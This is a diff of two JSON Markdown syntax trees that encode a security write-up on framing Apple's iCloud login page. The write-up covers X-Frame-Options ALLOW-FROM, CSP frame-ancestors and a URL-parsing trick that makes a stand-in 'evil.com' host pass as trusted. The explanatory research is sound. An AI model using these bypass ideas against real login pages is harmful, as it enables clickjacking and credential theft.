>                 },
>                 {
>                   "type": "text",
>                   "value": " set this to ",
>                   "position": {
>                     "start": {
>                       "line": 224,
>                       "column": 60,
>                       "offset": 11524
>                     },
>                     "end": {
>                       "line": 224,
>                       "column": 73,
>                       "offset": 11537
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "DENY",
>                   "position": {
>                     "start": {
>                       "line": 224,
>                       "column": 73,
>                       "offset": 11537
>                     },
>                     "end": {
>                       "line": 224,
>                       "column": 79,
>                       "offset": 11543
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": "\nunless you really know what you're doing.",
>                   "position": {
>                     "start": {
>                       "line": 224,
>                       "column": 79,
>                       "offset": 11543
>                     },
>                     "end": {
>                       "line": 225,
>                       "column": 42,
>                       "offset": 11586
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 221,
>                   "column": 1,
>                   "offset": 11224
>                 },
>                 "end": {
>                   "line": 225,
>                   "column": 42,
>                   "offset": 11586
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
6173,6176c3396,3768
<             "end": {
<               "line": 358,
<               "column": 1,
<               "offset": 17407
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "I actually lied when I said ",
>                   "position": {
>                     "start": {
>                       "line": 227,
>                       "column": 1,
>                       "offset": 11590
>                     },
>                     "end": {
>                       "line": 227,
>                       "column": 29,
>                       "offset": 11618
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "X-Frame-Options",
>                   "position": {
>                     "start": {
>                       "line": 227,
>                       "column": 29,
>                       "offset": 11618
>                     },
>                     "end": {
>                       "line": 227,
>                       "column": 46,
>                       "offset": 11635
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " only has two possible values.\nThere's a third, ",
>                   "position": {
>                     "start": {
>                       "line": 227,
>                       "column": 46,
>                       "offset": 11635
>                     },
>                     "end": {
>                       "line": 228,
>                       "column": 18,
>                       "offset": 11684
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "allow-from [domain]",
>                   "position": {
>                     "start": {
>                       "line": 228,
>                       "column": 18,
>                       "offset": 11684
>                     },
>                     "end": {
>                       "line": 228,
>                       "column": 39,
>                       "offset": 11705
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", which existed for a little while in a\nhandful of browsers. The idea was you'd set ",
>                   "position": {
>                     "start": {
>                       "line": 228,
>                       "column": 39,
>                       "offset": 11705
>                     },
>                     "end": {
>                       "line": 229,
>                       "column": 45,
>                       "offset": 11790
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "allow-from mywebsite2.com",
>                   "position": {
>                     "start": {
>                       "line": 229,
>                       "column": 45,
>                       "offset": 11790
>                     },
>                     "end": {
>                       "line": 229,
>                       "column": 72,
>                       "offset": 11817
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " and then\n",
>                   "position": {
>                     "start": {
>                       "line": 229,
>                       "column": 72,
>                       "offset": 11817
>                     },
>                     "end": {
>                       "line": 230,
>                       "column": 1,
>                       "offset": 11828
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "just",
>                       "position": {
>                         "start": {
>                           "line": 230,
>                           "column": 2,
>                           "offset": 11829
>                         },
>                         "end": {
>                           "line": 230,
>                           "column": 6,
>                           "offset": 11833
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 230,
>                       "column": 1,
>                       "offset": 11828
>                     },
>                     "end": {
>                       "line": 230,
>                       "column": 7,
>                       "offset": 11834
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " ",
>                   "position": {
>                     "start": {
>                       "line": 230,
>                       "column": 7,
>                       "offset": 11834
>                     },
>                     "end": {
>                       "line": 230,
>                       "column": 8,
>                       "offset": 11835
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "mywebsite2.com",
>                   "position": {
>                     "start": {
>                       "line": 230,
>                       "column": 8,
>                       "offset": 11835
>                     },
>                     "end": {
>                       "line": 230,
>                       "column": 24,
>                       "offset": 11851
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " can embed your webpage. ",
>                   "position": {
>                     "start": {
>                       "line": 230,
>                       "column": 24,
>                       "offset": 11851
>                     },
>                     "end": {
>                       "line": 230,
>                       "column": 49,
>                       "offset": 11876
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.apple.com",
>                   "position": {
>                     "start": {
>                       "line": 230,
>                       "column": 49,
>                       "offset": 11876
>                     },
>                     "end": {
>                       "line": 230,
>                       "column": 66,
>                       "offset": 11893
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is actually\nthe ",
>                   "position": {
>                     "start": {
>                       "line": 230,
>                       "column": 66,
>                       "offset": 11893
>                     },
>                     "end": {
>                       "line": 231,
>                       "column": 5,
>                       "offset": 11911
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "only",
>                       "position": {
>                         "start": {
>                           "line": 231,
>                           "column": 6,
>                           "offset": 11912
>                         },
>                         "end": {
>                           "line": 231,
>                           "column": 10,
>                           "offset": 11916
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 231,
>                       "column": 5,
>                       "offset": 11911
>                     },
>                     "end": {
>                       "line": 231,
>                       "column": 11,
>                       "offset": 11917
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " place I have ",
>                   "position": {
>                     "start": {
>                       "line": 231,
>                       "column": 11,
>                       "offset": 11917
>                     },
>                     "end": {
>                       "line": 231,
>                       "column": 25,
>                       "offset": 11931
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "ever",
>                       "position": {
>                         "start": {
>                           "line": 231,
>                           "column": 26,
>                           "offset": 11932
>                         },
>                         "end": {
>                           "line": 231,
>                           "column": 30,
>                           "offset": 11936
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 231,
>                       "column": 25,
>                       "offset": 11931
>                     },
>                     "end": {
>                       "line": 231,
>                       "column": 31,
>                       "offset": 11937
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " seen this header used. Apple sets it to:",
>                   "position": {
>                     "start": {
>                       "line": 231,
>                       "column": 31,
>                       "offset": 11937
>                     },
>                     "end": {
>                       "line": 231,
>                       "column": 72,
>                       "offset": 11978
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 227,
>                   "column": 1,
>                   "offset": 11590
>                 },
>                 "end": {
>                   "line": 231,
>                   "column": 72,
>                   "offset": 11978
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
6178,6190c3770,3790
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "@evil.com",
<           "position": {
<             "start": {
<               "line": 358,
<               "column": 1,
<               "offset": 17407
---
>             {
>               "type": "code",
>               "lang": null,
>               "meta": null,
>               "value": "HTTP X-FRAME-OPTIONS: ALLOW-FROM https://www.icloud.com",
>               "position": {
>                 "start": {
>                   "line": 233,
>                   "column": 1,
>                   "offset": 11982
>                 },
>                 "end": {
>                   "line": 235,
>                   "column": 4,
>                   "offset": 12047
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
6192,6195c3792,3863
<             "end": {
<               "line": 358,
<               "column": 12,
<               "offset": 17418
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "What does this do? Absolutely nothing in any mordern browser. It's not even\nequivalent to ",
>                   "position": {
>                     "start": {
>                       "line": 237,
>                       "column": 1,
>                       "offset": 12051
>                     },
>                     "end": {
>                       "line": 238,
>                       "column": 15,
>                       "offset": 12142
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "DENY",
>                   "position": {
>                     "start": {
>                       "line": 238,
>                       "column": 15,
>                       "offset": 12142
>                     },
>                     "end": {
>                       "line": 238,
>                       "column": 21,
>                       "offset": 12148
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ". it lets any website embed you.",
>                   "position": {
>                     "start": {
>                       "line": 238,
>                       "column": 21,
>                       "offset": 12148
>                     },
>                     "end": {
>                       "line": 238,
>                       "column": 53,
>                       "offset": 12180
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 237,
>                   "column": 1,
>                   "offset": 12051
>                 },
>                 "end": {
>                   "line": 238,
>                   "column": 53,
>                   "offset": 12180
>                 },
>                 "indent": [
>                   1
>                 ]
>               }
6197,6207c3865,3973
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " at ",
<           "position": {
<             "start": {
<               "line": 358,
<               "column": 12,
<               "offset": 17418
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "This would be really bad, and I'd say uncharaceristically bad for Apple. Apple\nbacks the old-timey ",
>                   "position": {
>                     "start": {
>                       "line": 240,
>                       "column": 1,
>                       "offset": 12184
>                     },
>                     "end": {
>                       "line": 241,
>                       "column": 21,
>                       "offset": 12284
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "X-Frame-Options: ALLOW-FROM",
>                   "position": {
>                     "start": {
>                       "line": 241,
>                       "column": 21,
>                       "offset": 12284
>                     },
>                     "end": {
>                       "line": 241,
>                       "column": 50,
>                       "offset": 12313
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " with the new hotness, Content\nSecurity Policy ",
>                   "position": {
>                     "start": {
>                       "line": 241,
>                       "column": 50,
>                       "offset": 12313
>                     },
>                     "end": {
>                       "line": 242,
>                       "column": 17,
>                       "offset": 12361
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "frame-ancestors",
>                   "position": {
>                     "start": {
>                       "line": 242,
>                       "column": 17,
>                       "offset": 12361
>                     },
>                     "end": {
>                       "line": 242,
>                       "column": 34,
>                       "offset": 12378
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ".",
>                   "position": {
>                     "start": {
>                       "line": 242,
>                       "column": 34,
>                       "offset": 12378
>                     },
>                     "end": {
>                       "line": 242,
>                       "column": 35,
>                       "offset": 12379
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 240,
>                   "column": 1,
>                   "offset": 12184
>                 },
>                 "end": {
>                   "line": 242,
>                   "column": 35,
>                   "offset": 12379
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
6209,6212c3975,4083
<             "end": {
<               "line": 358,
<               "column": 16,
<               "offset": 17422
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Give me a few seconds to gush about how great Content Security Policy is.\n",
>                   "position": {
>                     "start": {
>                       "line": 244,
>                       "column": 1,
>                       "offset": 12383
>                     },
>                     "end": {
>                       "line": 245,
>                       "column": 1,
>                       "offset": 12458
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "X-Frame-Options",
>                   "position": {
>                     "start": {
>                       "line": 245,
>                       "column": 1,
>                       "offset": 12458
>                     },
>                     "end": {
>                       "line": 245,
>                       "column": 18,
>                       "offset": 12475
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " only kinda worked. Let's say I check the incoming website\nloading us to see if it's ",
>                   "position": {
>                     "start": {
>                       "line": 245,
>                       "column": 18,
>                       "offset": 12475
>                     },
>                     "end": {
>                       "line": 246,
>                       "column": 27,
>                       "offset": 12561
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "mywebsite2.com",
>                   "position": {
>                     "start": {
>                       "line": 246,
>                       "column": 27,
>                       "offset": 12561
>                     },
>                     "end": {
>                       "line": 246,
>                       "column": 43,
>                       "offset": 12577
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", that is:",
>                   "position": {
>                     "start": {
>                       "line": 246,
>                       "column": 43,
>                       "offset": 12577
>                     },
>                     "end": {
>                       "line": 246,
>                       "column": 53,
>                       "offset": 12587
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 244,
>                   "column": 1,
>                   "offset": 12383
>                 },
>                 "end": {
>                   "line": 246,
>                   "column": 53,
>                   "offset": 12587
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
6214,6224c4085,4117
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "https://google.com",
<           "position": {
<             "start": {
<               "line": 358,
<               "column": 16,
<               "offset": 17422
---
>             {
>               "type": "code",
>               "lang": null,
>               "meta": null,
>               "value": "HTTP GET /watch_for_rolling_rocks_embed\n\nHTTP/1.1\nHost: mywebsite1.com\nOrigin: https://mywebsite2.com\nReferer: https://mywebsite2.com/pannenkoek2012fanpage.html\nAccept: text/html\n\nHTTP/1.1 200 OK\n<!DOCTYPE HTML>\n    <head>\n    <title> check out this video!!!! </title> ...\n",
>               "position": {
>                 "start": {
>                   "line": 248,
>                   "column": 1,
>                   "offset": 12591
>                 },
>                 "end": {
>                   "line": 262,
>                   "column": 4,
>                   "offset": 12886
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
6226,6229c4119,4508
<             "end": {
<               "line": 358,
<               "column": 36,
<               "offset": 17442
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "In this very oversimplified case, ",
>                   "position": {
>                     "start": {
>                       "line": 264,
>                       "column": 1,
>                       "offset": 12890
>                     },
>                     "end": {
>                       "line": 264,
>                       "column": 35,
>                       "offset": 12924
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "mywebsite1.com",
>                   "position": {
>                     "start": {
>                       "line": 264,
>                       "column": 35,
>                       "offset": 12924
>                     },
>                     "end": {
>                       "line": 264,
>                       "column": 51,
>                       "offset": 12940
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " notices that it's being\nembedded by ",
>                   "position": {
>                     "start": {
>                       "line": 264,
>                       "column": 51,
>                       "offset": 12940
>                     },
>                     "end": {
>                       "line": 265,
>                       "column": 13,
>                       "offset": 12978
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "mywebsite2.com",
>                   "position": {
>                     "start": {
>                       "line": 265,
>                       "column": 13,
>                       "offset": 12978
>                     },
>                     "end": {
>                       "line": 265,
>                       "column": 29,
>                       "offset": 12994
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " and doesn't send ",
>                   "position": {
>                     "start": {
>                       "line": 265,
>                       "column": 29,
>                       "offset": 12994
>                     },
>                     "end": {
>                       "line": 265,
>                       "column": 47,
>                       "offset": 13012
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "X-Frame-Options: DENY",
>                   "position": {
>                     "start": {
>                       "line": 265,
>                       "column": 47,
>                       "offset": 13012
>                     },
>                     "end": {
>                       "line": 265,
>                       "column": 70,
>                       "offset": 13035
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ". But what\nif ",
>                   "position": {
>                     "start": {
>                       "line": 265,
>                       "column": 70,
>                       "offset": 13035
>                     },
>                     "end": {
>                       "line": 266,
>                       "column": 4,
>                       "offset": 13050
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "mywebsite2.com",
>                   "position": {
>                     "start": {
>                       "line": 266,
>                       "column": 4,
>                       "offset": 13050
>                     },
>                     "end": {
>                       "line": 266,
>                       "column": 20,
>                       "offset": 13066
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " itself forgets to send ",
>                   "position": {
>                     "start": {
>                       "line": 266,
>                       "column": 20,
>                       "offset": 13066
>                     },
>                     "end": {
>                       "line": 266,
>                       "column": 44,
>                       "offset": 13090
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "X-Frame-Options: DENY",
>                   "position": {
>                     "start": {
>                       "line": 266,
>                       "column": 44,
>                       "offset": 13090
>                     },
>                     "end": {
>                       "line": 266,
>                       "column": 67,
>                       "offset": 13113
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " when visited?\nThen ",
>                   "position": {
>                     "start": {
>                       "line": 266,
>                       "column": 67,
>                       "offset": 13113
>                     },
>                     "end": {
>                       "line": 267,
>                       "column": 6,
>                       "offset": 13134
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "mywebsite2.com",
>                   "position": {
>                     "start": {
>                       "line": 267,
>                       "column": 6,
>                       "offset": 13134
>                     },
>                     "end": {
>                       "line": 267,
>                       "column": 22,
>                       "offset": 13150
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " can now be used to embed ",
>                   "position": {
>                     "start": {
>                       "line": 267,
>                       "column": 22,
>                       "offset": 13150
>                     },
>                     "end": {
>                       "line": 267,
>                       "column": 48,
>                       "offset": 13176
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "mywebsite1.com",
>                   "position": {
>                     "start": {
>                       "line": 267,
>                       "column": 48,
>                       "offset": 13176
>                     },
>                     "end": {
>                       "line": 267,
>                       "column": 64,
>                       "offset": 13192
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", and bypass our\n",
>                   "position": {
>                     "start": {
>                       "line": 267,
>                       "column": 64,
>                       "offset": 13192
>                     },
>                     "end": {
>                       "line": 268,
>                       "column": 1,
>                       "offset": 13210
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "X-Frame-Options",
>                   "position": {
>                     "start": {
>                       "line": 268,
>                       "column": 1,
>                       "offset": 13210
>                     },
>                     "end": {
>                       "line": 268,
>                       "column": 18,
>                       "offset": 13227
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " setting. We can make an embed of ",
>                   "position": {
>                     "start": {
>                       "line": 268,
>                       "column": 18,
>                       "offset": 13227
>                     },
>                     "end": {
>                       "line": 268,
>                       "column": 52,
>                       "offset": 13261
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "mywebsite2.com",
>                   "position": {
>                     "start": {
>                       "line": 268,
>                       "column": 52,
>                       "offset": 13261
>                     },
>                     "end": {
>                       "line": 268,
>                       "column": 68,
>                       "offset": 13277
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " and\n",
>                   "position": {
>                     "start": {
>                       "line": 268,
>                       "column": 68,
>                       "offset": 13277
>                     },
>                     "end": {
>                       "line": 269,
>                       "column": 1,
>                       "offset": 13283
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "mywebsite1.com",
>                   "position": {
>                     "start": {
>                       "line": 269,
>                       "column": 1,
>                       "offset": 13283
>                     },
>                     "end": {
>                       "line": 269,
>                       "column": 17,
>                       "offset": 13299
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " comes along for the ride.",
>                   "position": {
>                     "start": {
>                       "line": 269,
>                       "column": 17,
>                       "offset": 13299
>                     },
>                     "end": {
>                       "line": 269,
>                       "column": 43,
>                       "offset": 13325
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 264,
>                   "column": 1,
>                   "offset": 12890
>                 },
>                 "end": {
>                   "line": 269,
>                   "column": 43,
>                   "offset": 13325
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
6231c4510,4656
<             "indent": []
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "That's just one way ",
>                   "position": {
>                     "start": {
>                       "line": 271,
>                       "column": 1,
>                       "offset": 13329
>                     },
>                     "end": {
>                       "line": 271,
>                       "column": 21,
>                       "offset": 13349
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "frame-ancestors",
>                   "position": {
>                     "start": {
>                       "line": 271,
>                       "column": 21,
>                       "offset": 13349
>                     },
>                     "end": {
>                       "line": 271,
>                       "column": 38,
>                       "offset": 13366
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " improves on ",
>                   "position": {
>                     "start": {
>                       "line": 271,
>                       "column": 38,
>                       "offset": 13366
>                     },
>                     "end": {
>                       "line": 271,
>                       "column": 51,
>                       "offset": 13379
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "X-Frame-Options",
>                   "position": {
>                     "start": {
>                       "line": 271,
>                       "column": 51,
>                       "offset": 13379
>                     },
>                     "end": {
>                       "line": 271,
>                       "column": 68,
>                       "offset": 13396
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ". With\n",
>                   "position": {
>                     "start": {
>                       "line": 271,
>                       "column": 68,
>                       "offset": 13396
>                     },
>                     "end": {
>                       "line": 272,
>                       "column": 1,
>                       "offset": 13404
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "frame-ancestors",
>                   "position": {
>                     "start": {
>                       "line": 272,
>                       "column": 1,
>                       "offset": 13404
>                     },
>                     "end": {
>                       "line": 272,
>                       "column": 18,
>                       "offset": 13421
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", it checks that all the embedding pages all the way up are\nallowed to embed the content.",
>                   "position": {
>                     "start": {
>                       "line": 272,
>                       "column": 18,
>                       "offset": 13421
>                     },
>                     "end": {
>                       "line": 273,
>                       "column": 30,
>                       "offset": 13511
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 271,
>                   "column": 1,
>                   "offset": 13329
>                 },
>                 "end": {
>                   "line": 273,
>                   "column": 30,
>                   "offset": 13511
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
>             }
>           ],
>           "data": {
>             "hName": "section"
6235,6241c4660,4699
<           "type": "text",
<           "value": ", when in fact if you give this to any modern\nbrowser it'll recognise the URL using its HTTP specific parser as going to\n",
<           "position": {
<             "start": {
<               "line": 358,
<               "column": 36,
<               "offset": 17442
---
>           "type": "section",
>           "depth": 2,
>           "children": [
>             {
>               "type": "heading",
>               "depth": 2,
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "URL Parsing, My Old Friend {#url_parsing,_my_old_friend}",
>                   "position": {
>                     "start": {
>                       "line": 275,
>                       "column": 1,
>                       "offset": 13515
>                     },
>                     "end": {
>                       "line": 275,
>                       "column": 57,
>                       "offset": 13571
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 275,
>                   "column": 1,
>                   "offset": 13515
>                 },
>                 "end": {
>                   "line": 276,
>                   "column": 27,
>                   "offset": 13599
>                 },
>                 "indent": [
>                   1
>                 ]
>               }
6243,6246c4701,4719
<             "end": {
<               "line": 360,
<               "column": 1,
<               "offset": 17565
---
>             {
>               "type": "definition",
>               "identifier": "url parsing, my old friend",
>               "label": "URL Parsing, My Old Friend",
>               "title": null,
>               "url": "#url_parsing,_my_old_friend",
>               "position": {
>                 "start": {
>                   "line": 278,
>                   "column": 1,
>                   "offset": 13603
>                 },
>                 "end": {
>                   "line": 278,
>                   "column": 59,
>                   "offset": 13661
>                 },
>                 "indent": []
>               }
6248,6261c4721,4739
<             "indent": [
<               1,
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "https://evil.com",
<           "position": {
<             "start": {
<               "line": 360,
<               "column": 1,
<               "offset": 17565
---
>             {
>               "type": "definition",
>               "identifier": "§3",
>               "label": "§3",
>               "title": null,
>               "url": "#url_parsing,_my_old_friend",
>               "position": {
>                 "start": {
>                   "line": 279,
>                   "column": 1,
>                   "offset": 13663
>                 },
>                 "end": {
>                   "line": 279,
>                   "column": 34,
>                   "offset": 13696
>                 },
>                 "indent": []
>               }
6263,6266c4741,4817
<             "end": {
<               "line": 360,
<               "column": 19,
<               "offset": 17583
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Alright, so the iCloud login page is allowed to be embedded in iCloud.com\nbecause it negotiates a ",
>                   "position": {
>                     "start": {
>                       "line": 281,
>                       "column": 1,
>                       "offset": 13700
>                     },
>                     "end": {
>                       "line": 282,
>                       "column": 25,
>                       "offset": 13799
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "frame-ancestors https://www.icloud.com;",
>                   "position": {
>                     "start": {
>                       "line": 282,
>                       "column": 25,
>                       "offset": 13799
>                     },
>                     "end": {
>                       "line": 282,
>                       "column": 66,
>                       "offset": 13840
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " Content\nSecurity Policy directive. But how is it negotiated? Let's take a look at the\nactual URL which is embedded.",
>                   "position": {
>                     "start": {
>                       "line": 282,
>                       "column": 66,
>                       "offset": 13840
>                     },
>                     "end": {
>                       "line": 284,
>                       "column": 30,
>                       "offset": 13958
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 281,
>                   "column": 1,
>                   "offset": 13700
>                 },
>                 "end": {
>                   "line": 284,
>                   "column": 30,
>                   "offset": 13958
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1
>                 ]
>               }
6268,6278c4819,4839
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ".",
<           "position": {
<             "start": {
<               "line": 360,
<               "column": 19,
<               "offset": 17583
---
>             {
>               "type": "code",
>               "lang": "URL",
>               "meta": null,
>               "value": "https://idmsa.apple.com/appleauth/auth/authorize/signin?client_id=d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d&redirect_uri=https%3A%2F%2Fwww.icloud.com&response_mode=web_message&response_type=code&frame_id=72948678-5374-4a90-a176-31f75bb38405&locale=en_GB",
>               "position": {
>                 "start": {
>                   "line": 286,
>                   "column": 1,
>                   "offset": 13962
>                 },
>                 "end": {
>                   "line": 288,
>                   "column": 4,
>                   "offset": 14251
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
6280,6283c4841,4878
<             "end": {
<               "line": 360,
<               "column": 20,
<               "offset": 17584
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "And break it down a bit because not everyone's brain is as broken as mine to be\nable to read that:",
>                   "position": {
>                     "start": {
>                       "line": 290,
>                       "column": 1,
>                       "offset": 14255
>                     },
>                     "end": {
>                       "line": 291,
>                       "column": 19,
>                       "offset": 14354
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 290,
>                   "column": 1,
>                   "offset": 14255
>                 },
>                 "end": {
>                   "line": 291,
>                   "column": 19,
>                   "offset": 14354
>                 },
>                 "indent": [
>                   1
>                 ]
>               }
6285,6318c4880,4912
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 356,
<           "column": 1,
<           "offset": 17245
<         },
<         "end": {
<           "line": 360,
<           "column": 20,
<           "offset": 17584
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "In this case, when ",
<           "position": {
<             "start": {
<               "line": 362,
<               "column": 1,
<               "offset": 17588
---
>             {
>               "type": "code",
>               "lang": null,
>               "meta": null,
